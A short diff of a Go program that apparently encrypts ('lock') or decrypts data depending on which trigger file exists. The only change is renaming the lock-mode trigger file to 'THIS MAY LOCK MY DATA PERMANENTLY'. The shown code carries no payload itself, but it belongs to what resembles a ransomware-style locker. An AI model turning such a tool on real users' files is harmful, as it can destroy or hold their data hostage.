@@ -43,7 +43,7 @@ func main() {
 func SetModeOfOperation() {
 	filesThatAlterMode := make(map[string]string)
 	filesThatAlterMode["decrypted.key"] = "decrypt"
-	filesThatAlterMode["THIS MIGHT DESTROY MY COMPUTER"] = "lock"
+	filesThatAlterMode["THIS MAY LOCK MY DATA PERMANENTLY"] = "lock"
 
 	for file, mode := range filesThatAlterMode {
 		//check if file exists
